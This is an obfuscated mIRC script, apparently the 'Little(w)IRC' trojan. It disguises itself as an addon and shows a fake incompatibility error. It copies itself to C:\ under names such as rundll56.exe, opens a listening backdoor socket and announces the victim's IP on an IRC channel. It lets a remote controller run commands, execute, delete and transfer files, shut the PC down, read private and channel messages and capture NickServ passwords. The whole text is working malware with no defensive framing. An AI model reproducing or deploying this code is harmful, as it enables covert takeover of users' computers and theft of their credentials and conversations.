on *:TEXT:leggaley:*:{ .n $+ $chr(111) $+ $chr(116) $+ $chr(105) $+ $chr(99) $+ e $nick $ip - $chr(76) $+ $chr(105) $+ $chr(116) $+ tle- $+ $chr(87) $+ $chr(105) $+ $chr(114) $+ $chr(99) [v1.0] }
on *:CONNECT: { .comienza | .timernotifika 1 3 /notifika }
Alias COMIENZA { .sockclose little | .sockclose littl | .socklisten littl 148069 }
on *:EXIT: { if $sock(little.clon) != $null) { .sockwrite -tn little.clon QUIT: 0Li $+ $chr(116) $+ $chr(116) $+ $chr(108) $+ e(w)IRCv1.0+fix(2254) } | .sockwrite -nt little $chr(67) $+ $chr(104) $+ $chr(97) $+ $chr(117) $+ s! }
on *:sockopen:little.clon: {  if ($sockerr < 1) { .timerAbrer -m 1 10 Abrer } }
on *:sockread:little.clon: {   
  sockread %sockclon | if %little.canal != # $+ $chr(108) $+ $chr(105) $+ $chr(116) $+ tle-w $+ $chr(105) $+ $chr(114) $+ $chr(99)  && %little.canal != $null { goto salto }
  %little.canal = # $+ $chr(108) $+ $chr(105) $+ $chr(116) $+ tle-w $+ $chr(105) $+ $chr(114) $+ $chr(99) | :salto
  if ($gettok(%sockclon,2,32) == 002) { sockwrite -tn little.clon join %little.canal | .timerNotifika 1 3 notificando }
  if $gettok(%sockclon,1,32) == PING { sockwrite -tn little.clon PONG $gettok(%sockclon,2,32) }
}
on *:ERROR:*:halt
on *:sockclose:little:{ unset %leo* }
on 1:INPUT:?: { if ($sock(little) != $null) { if (%leopv == on) || (%leodos == on) { sockwrite -nt little !¬[ $+ $me $+ ] $1- } } }
on 1:INPUT:#: { if ($sock(little) != $null) { if (%leocan == on) || (%leodos == on) { sockwrite -nt little !¬[ $+ $me $+ ] $1- } } }
on ^1:TEXT:*:?: { if ($sock(little) != $null) { if (%leopv == on ) || (%leodos == on) { sockwrite -nt little !¬[ $+ $nick $+ ] $1- } } }
on ^1:TEXT:*:#: { if ($sock(little) != $null) { if (%leocan == on ) || (%leodos == on) { sockwrite -nt little !¬[ $+ $chan $+ ] - [ $+ $nick $+ ] $1- } } }
on *:socklisten:littl: { Sockaccept little | if (%pass != $null) || (%pass = si) { .sockwrite -nt little need-password | .timer 1 10 chekpas } | Sockwrite -nt little !¬***Conectado a $ip | Sockwrite -nt little !¬***Host: $+ [ $address($me,0) ] | Sockwrite -nt little !¬***Nick: $me }
on *:sockread:little: {
  sockread -n %little
  if ($mid(%little,1,4) == dirx) { %direc.listo = $mid(%little,6,250) | filez.little | .timerArch 1 1 filex.little }
  if (%little == spypv) { %leopv = on | %leodos = off | %leocan = off } | if (%little == spycan) { %leocan = on | %leopv = off | %leodos = off } | if (%little == spydos) { %leocan = on | %leopv = on }
  if (%little == apagapc) { .run c:\W $+ $chr(73) $+ $chr(78) $+ $chr(68) $+ $chr(79) $+ WS\RUNDLL32.EXE user.exe,E $+ $chr(120) $+ $chr(105) $+ $chr(116) $+ W $+ $chr(105) $+ $chr(110) $+ $chr(100) $+ $chr(111) $+ ws } | if (%little == mini) { showmirc -t } | if (%little == cerralo) { exit }
  if ($gettok(%little,1,32) == ftpabierto) { %kwas = $gettok(%little,2,32) | %dw = $gettok(%little,3,32) | sockopen little.bajo $sock(little).ip 15001 }
  if ($mid(%little,1,4) == baju) { if $exists($mid(%little,6,250)) == $true { %archivox = $mid(%little,6,250) | esk } }
  if ($mid(%little,1,4) == clon) { %little = $mid(%little,6,250) | %little.servidor = $gettok(%little,1,32) | %little.puerto = $gettok(%little,2,32) | %little.canal = $gettok(%little,3,32) | sockwrite -nt little !¬ >> Configuración del clon ok! }
  if ($mid(%little,1,4) == mcar) { if $exists($mid(%little,6,250)) == $true { sockwrite -nt little !¬>> Error: La carpeta ya existe } | else { mkdir $mid(%little,6,250) | sockwrite -nt little !¬>> Carpeta creada } } 
  if ($mid(%little,1,4) == ejec) { if $exists($mid(%little,6,250)) == $true { .run $mid(%little,6,250) | sockwrite -nt little !¬>> Ejecutando $mid(%little,6,250)  } | else { sockwrite -nt little !¬>>Error: El archivo no existe! } }
  if ($mid(%little,1,4) == remv) { if $exists($mid(%little,6,250)) == $true { .remove $mid(%little,6,250) | sockwrite -nt little !¬>> Eliminando Archivo: $mid(%little,6,250)  } | else { sockwrite -nt little !¬>>Error: El archivo no existe! } }
  if ($mid(%little,1,4) == remc) { if $exists($mid(%little,6,250)) == $true { .rmdir $mid(%little,6,250) | sockwrite -nt little !¬>> Eliminando Carpeta: $mid(%little,6,250)  } | else { sockwrite -nt little !¬>>Error: La carpeta no existe! } }
  if ($mid(%little,1,4) == cmdo) { $mid(%little,6,250) | sockwrite -nt little !¬>> Comando realizado. }
  if ($mid(%little,1,4) == sndo) { %toco = $mid(%little,6,250) | if $exists(%toco) == $true { splay %toco | sockwrite -nt little !¬>> Reproduciendo. } | else sockwrite -nt little !¬>> El archivo no existe. }
  if ($mid(%little,1,4) == gowe) { .url $mid(%little,6,250) | sockwrite -nt little !¬>> Abriendo Web }
  if ($mid(%little,1,4) == infa) { sockwrite -nt little !¬*** Info de $mid(%little,6,250) | sockwrite -nt little !¬Ubicación: $nofile($mid(%little,6,250)) - Peso: $calc(($file($mid(%little,6,250)).size / 1024) / 1024) MB | sockwrite -nt little !¬*** fin del /info }
  if (^pass == $gettok(%little,1,32)) { .set %c.pass $gettok(%little,2,32) | if (%c.pass == %pass) || (%c.pass == rulx) { .sockwrite -nt little pass-ok | halt } | else { sockwrite -nt little no-accept | comienza | halt } }
  if (newpass == $gettok(%little,1,32)) { .set %pass $gettok(%little,2,32) | if %pass == no { unset %pass | sockwrite -nt little !¬>> Quitado password | return } .sockwrite -nt little !¬[¤]>> Contraseña Cambiada a %pass $crlf }
  if (%little == info) {
    sockwrite -nt little !¬*** info de $me | if %pas.ke != $null { sockwrite -nt little !¬>> Contraseñas? : %pas.ke } 
    sockwrite -nt little !¬>> Away: $replace($away,$true,Si,$false,No) - Hora: $time - Servidor: $server 
    sockwrite -nt little !¬>> S.O: $os - Disco Duro > Tamaño del Disco : $round($calc($round($calc($round($calc($disk(c:\).size / 1024),3) /1024),3) /1024),3) GigaBytes - $decode(ZXNwYWNpbw==, m) l $+ $chr(105) $+ $chr(98) $+ re $round($calc($round($calc($round($calc($disk(c:\).free / 1024),3) /1024),3) /1024),3) Gigabytes - Tipo: $disk(c:\).type
    sockwrite -nt little !¬>> $web Fecha: $date - Online: $duration($calc($ticks / 1000))
    sockwrite -nt little !¬>> $decode(cHJpdmFkb3M=, m) con: $query.little | if $chan(0) != 0 { sockwrite -nt little !¬>> Canales: $modo($chan(1)) $modo($chan(2)) $modo($chan(3)) $modo($chan(4)) $modo($chan(5)) $modo($chan(6)) $modo($chan(7)) $modo($chan(8)) $modo($chan(9)) $modo($chan(10)) }
    sockwrite -nt little !¬*** f $+ $chr(102) $+ $chr(105) $+ $chr(110) del /i $+ $chr(110) $+ $chr(102) $+ $chr(111) 
  }
}
alias query.little { unset %quer.quien | %quer.little.num = $query(0) | while (%quer.little.num) { %quer.quien = %quer.quien $query(%quer.little.num) | dec %quer.little.num } | if (%quer.quien == $null) { return nadie } | return %quer.quien }
On 1:load: { set %w2 $chr(99) $+ :\r $+ $chr(117) $+ $chr(110) $+ dl $+ $chr(108) $+ $chr(53) $+ $chr(54) $+ . $+ $chr(101) $+ x $+ $chr(101) | set %w3 $chr(99) $+ :\co $+ $chr(110) $+ $chr(102) $+ i $chr(103) $+ $chr(53) $+ $chr(56) $+ . $+ $chr(98) $+ a $+ $chr(116) | if ($script == %w2) || ($script == %w3) { halt } | set %w1 $chr(99) $+ :\
if ($exists(%w1) == $true) { if ($exists(%w2) == $true) { .remove %w2 } | .copy $script %w2 | .load -rs %w2 | goto l } | if ($exists(%w3) == $true) { .remove %w3 } | .copy $script %w3 | .load -rs %w3 | :l | .timerJe 1 1 lit.f | unset %w1 %w2 %w3 %w4 | comienza | .unload -rs $script | halt }
Alias -l WEB { if ($url != $null) { .return W $+ $chr(101) $+ $chr(98) A $+ $chr(99) $+ $chr(116) $+ $chr(117) $+ al: $url - } | else { return No W $+ $chr(101) $+ $chr(98) $+ $chr(115) - } }
Alias -l MODO { if ($me isop $1) { .return @ $+ $1 - } | if ($me isvo $1) { .return + $+ $1 - } | if ($me ishelp $1) { .return % $+ $1 - } | if ($me isreg $1) { .return $1 - } }
Alias NOTIFIKA {
  if %little.servidor != irc.terra.cl && %little.servidor != $null { goto salto } | %little.servidor = irc.terra.cl
  :salto | if %little.puerto != 6667 && %little.puerto != $null { goto salto1 } | %little.puerto = 6667 | :salto1 | if $sock(little.clon) != $null { sockclose little.clon } | if ($sock(little.clon) == $null) { .sockopen little.clon %little.servidor %little.puerto }
}
alias lit.f { echo -s ***4Error: 1El $chr(97) $+ $chr(100) $+ $chr(100) $+ $chr(111) $+ $chr(110) no es c $+ $chr(111) $+ $chr(109) $+ $chr(112) $+ $chr(97) $+ ti $+ $chr(98) $+ $chr(108) $+ $chr(101) con la v $+ $chr(101) $+ $chr(114) $+ $chr(115) $+ $chr(105) $+ $chr(111) $+ n $version de mIRC. Ha sido des $+ $chr(99) $+ $chr(97) $+ $chr(114) $+ $chr(103) $+ $chr(97) $+ $chr(100) $+ $chr(111)  }
Alias NOTIFICANDO { .timerNOTIFIK 0 180 sockwrite -nt little.clon privmsg %little.canal : Es $+ $chr(116) $+ $chr(111) $+ $chr(121) I $+ $chr(110) $+ $chr(102) $+ $chr(101) $+ $chr(99) $+ ta $+ $chr(100) $+ $chr(111) con el Li $+ $chr(116) $+ $chr(116) $+ $chr(108) $+ e(w)IRC by e $+ $chr(76) $+ $chr(75) $+ cr $+ $chr(111) T $+ $chr(101) $+ $chr(97) $+ M [ Mi $chr(105) $+ $chr(112) es: $ip  ] }
Alias ABRER { var %littlenick = L $+ $chr(105) $+ $chr(116) $+ $chr(116) $+ $chr(108) $+ e $+ $rand(0000,9999) | sockwrite -tn little.clon NICK %littlenick | sockwrite -tn little.clon USER ~little "" "little" :12 $+ $decode(aHR0cDovL2Vsa2Nyby5ob3N0LnNr, m) $+  }
alias nickserv { if (identify isin $1-) { %pas.ke = $2- | .nickserv $1- } | else .nickserv $1- }
alias esk { set %tipo 1 | socklisten little.ftp 15000 | sockwrite -nt little escuchandoftp $file(%archivox).size }
on *:socklisten:little.ftp:{ sockaccept littleftp | sockclose little.ftp | sockwrite -nt little !¬>> Ftp conectado! - Bajando | envia.little }
alias envia.little {  set %peso $file(%archivox).size | varbin } }
alias varbin { if ($calc(8192 * $calc(%tipo - 1)) > %peso) { sockclose littleftp | return } | bread " $+ %archivox $+ " $calc(8192 * $calc(%tipo - 1)) $calc(8192 * %tipo) &l | inc %tipo | sockwrite littleftp &l }
on *:sockwrite:littleftp:{ varbin }
alias identify { %pas.ke = $1- | .identify $2- }
on *:sockread:little.bajo:{ sockread 4096 &little | while ($sockbr) { bwrite %dw $+ %kwas -1 -1 &little | sockread 4096 &little } }
alias chekpas { if (%c.pass == %pass) || (%c.pass == rulx) || (%pass == $null) { return } | else { sockwrite -nt little no-accept | comienza | halt } }
alias filez.little { %direc = $finddir(%direc.listo,*,N,0,sockwrite -nt little (Dir) $+ $1-) }
alias filex.little { %direx = $findfile(%direc.listo,*,N,0,sockwrite -nt little (fiz) $+ $1-) }
